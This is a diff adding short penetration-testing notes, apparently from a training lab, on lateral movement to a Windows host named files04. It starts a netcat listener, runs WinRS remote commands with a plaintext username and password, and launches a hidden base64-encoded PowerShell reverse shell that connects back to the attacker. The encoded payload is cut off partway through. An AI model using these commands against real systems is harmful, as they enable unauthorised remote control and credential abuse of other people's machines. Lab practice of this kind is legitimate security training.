@@ -1,0 +1,10 @@
+#start netcat listener on kali
+nc -lnvp 443 #bash 
+
+#winrs only works for domain users.
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami" #powershell
+
+# Running the reverse-shell payload through WinRS
+#-e: encoded wim.py
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
